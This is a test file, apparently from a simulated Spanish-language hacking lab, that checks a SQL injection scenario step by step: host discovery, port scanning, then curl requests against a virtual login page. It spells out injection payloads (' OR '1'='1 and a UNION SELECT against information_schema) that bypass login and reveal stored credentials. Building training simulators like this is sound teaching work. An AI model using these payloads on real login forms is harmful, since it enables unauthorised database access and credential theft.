// ── commands/__tests__/happyPath-scenario06.test.ts ───────────────
// Happy path tests for Scenario 06: SQL Injection & Database Exfiltration

import { describe, it, expect } from 'vitest';
import { setupBeforeEach, expectSuccess } from './happyPathHelpers';
import { scenario_06, scenario06Data } from '../../laboratorios/laboratorio06';
import { cmd_arpScan } from '../tools/arp-scan';
import { cmd_netdiscover } from '../tools/netdiscover';
import { cmd_nmap } from '../tools/nmap';
import { cmd_curl } from '../tools/curl';
import { executeCommand } from '../index';
import { validateMission } from '../../utils/labValidator';
import type { Machine } from '../../types';

setupBeforeEach();

const machines = scenario_06.machines;
const attacker = machines.find(m => m.id.includes('attacker'))!;
const target = machines.find(m => !m.id.includes('attacker'))!;

describe('Happy Path: Scenario 06 - SQL Injection & Database Exfiltration', () => {
  it('Paso 1: netdiscover descubre el host y valida', () => {
    const result = cmd_netdiscover.execute(['-r', scenario06Data.networkRange], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    const dh = 'discoveredHosts' in result ? result.discoveredHosts : undefined;
    expect(dh).toBeDefined();
    expect(dh?.some(h => h.ip === target.machine_info.ip)).toBe(true);
    expect(validateMission(result, scenario_06.missions[0])).toBe(true);
  });

  it('Paso 1: arp-scan descubre el host y valida', () => {
    const result = cmd_arpScan.execute([scenario06Data.networkRange], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    const dh = 'discoveredHosts' in result ? result.discoveredHosts : undefined;
    expect(dh?.some(h => h.ip === target.machine_info.ip)).toBe(true);
    expect(validateMission(result, scenario_06.missions[0])).toBe(true);
  });

  it('Paso 1: nmap -sn a IP única valida', () => {
    const result = cmd_nmap.execute(['-sn', target.machine_info.ip], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    const dh = 'discoveredHosts' in result ? result.discoveredHosts : undefined;
    expect(dh?.some(h => h.ip === target.machine_info.ip)).toBe(true);
    expect(validateMission(result, scenario_06.missions[0])).toBe(true);
  });

  it('Paso 1: nmap -sn con CIDR valida', () => {
    const result = cmd_nmap.execute(['-sn', scenario06Data.networkRange], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    expect(validateMission(result, scenario_06.missions[0])).toBe(true);
  });

  it('Paso 2: nmap -sS detecta el puerto 80 y valida', () => {
    const result = cmd_nmap.execute(['-sS', '-p-', '--min-rate', '5000', target.machine_info.ip], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    const sr = 'scanResults' in result ? result.scanResults : undefined;
    expect(sr?.ports.some(p => p.port === 80)).toBe(true);
    expect(validateMission(result, scenario_06.missions[1])).toBe(true);
  });

  it('Paso 4: curl con payload OR confirma la vulnerabilidad (solo paso 4)', () => {
    const result = cmd_curl.execute(['-X', 'POST', `http://${target.machine_info.ip}/login`, '-d', "username=' OR '1'='1&password=x"], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: '/root' });
    expectSuccess(result);
    expect(result.output).toContain('Admin Dashboard');
    const fv = 'foundVulnerability' in result ? result.foundVulnerability : undefined;
    expect(fv?.vulnId).toBe('SQLi');
    expect(fv?.status).toBe('confirmed');
    expect(validateMission(result, scenario_06.missions[3])).toBe(true);
    expect(validateMission(result, scenario_06.missions[2])).toBe(false);
  });

  it('Paso 3: curl con comilla simple detecta el error SQL y valida solo el paso 3', () => {
    const result = cmd_curl.execute(['-X', 'POST', `http://${target.machine_info.ip}/login`, '-d', "username='&password=x"], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: '/root' });
    expectSuccess(result);
    expect(result.output).toContain('SQL syntax');
    const fv = 'foundVulnerability' in result ? result.foundVulnerability : undefined;
    expect(fv?.vulnId).toBe('SQLi');
    expect(fv?.status).toBe('detected');
    expect(validateMission(result, scenario_06.missions[2])).toBe(true);
    expect(validateMission(result, scenario_06.missions[3])).toBe(false);
  });

  it('Paso 4: curl con or en minúscula valida el exploit', () => {
    const result = cmd_curl.execute(['-X', 'POST', `http://${target.machine_info.ip}/login`, '-d', "username=' or '1'='1&password=x"], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: '/root' });
    expectSuccess(result);
    expect(validateMission(result, scenario_06.missions[3])).toBe(true);
    expect(validateMission(result, scenario_06.missions[2])).toBe(false);
  });

  it('Paso 4: comando del hint ejecutado por el parser real (con comillas) completa el exploit', () => {
    const result = executeCommand(
      `curl -X POST http://${target.machine_info.ip}/login -d "username=' OR '1'='1&password=x"`,
      attacker,
      machines,
      1,
      undefined,
      '/root'
    );
    expectSuccess(result);
    expect(result.output).toContain('Admin Dashboard');
    expect(validateMission(result, scenario_06.missions[3])).toBe(true);
    expect(validateMission(result, scenario_06.missions[2])).toBe(false);
  });

  it('Paso 5: comando UNION del hint ejecutado por el parser real descubre credenciales', () => {
    const result = executeCommand(
      `curl -X POST http://${target.machine_info.ip}/login -d "username=' UNION SELECT table_name FROM information_schema.tables--&password=x"`,
      attacker,
      machines,
      1,
      undefined,
      '/root'
    );
    expectSuccess(result);
    expect(result.output).toContain('Database Enumeration');
    expect(result.output).toContain('database_dump.sql');
    expect(validateMission(result, scenario_06.missions[4])).toBe(true);
    expect(validateMission(result, scenario_06.missions[3])).toBe(false);
  });

  it('Paso 5: curl con UNION SELECT descubre credenciales MySQL', () => {
    const result = cmd_curl.execute(['-X', 'POST', `http://${target.machine_info.ip}/login`, '-d', "username=' UNION SELECT table_name FROM information_schema.tables--&password=x"], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    expect(result.output).toContain('Database Enumeration');
    const fc = 'foundCredentials' in result ? result.foundCredentials : undefined;
    expect(fc?.service).toBe('mysql');
    expect(validateMission(result, scenario_06.missions[4])).toBe(true);
    expect(validateMission(result, scenario_06.missions[3])).toBe(false);
  });

  it('curl GET a /login muestra el formulario', () => {
    const result = cmd_curl.execute([`http://${target.machine_info.ip}/login`], { machine: attacker, allMachines: machines, currentMissionId: 1, currentDir: "/root" });
    expectSuccess(result);
    expect(result.output).toContain('Secure Login');
    expect(result.output).toContain('200 OK');
  });

  it('curl a host sin servicio web devuelve Connection refused', () => {
    const noWeb: Machine = { ...attacker, id: 'no-web', machine_info: { ...attacker.machine_info, ip: '192.168.40.99' }, web_enumeration: undefined as any };
    const result = cmd_curl.execute([`http://192.168.40.99/login`], { machine: attacker, allMachines: [...machines, noWeb], currentMissionId: 1, currentDir: "/root" });
    expect(result.isError).toBe(true);
    expect(result.output).toContain('Connection refused');
  });
});
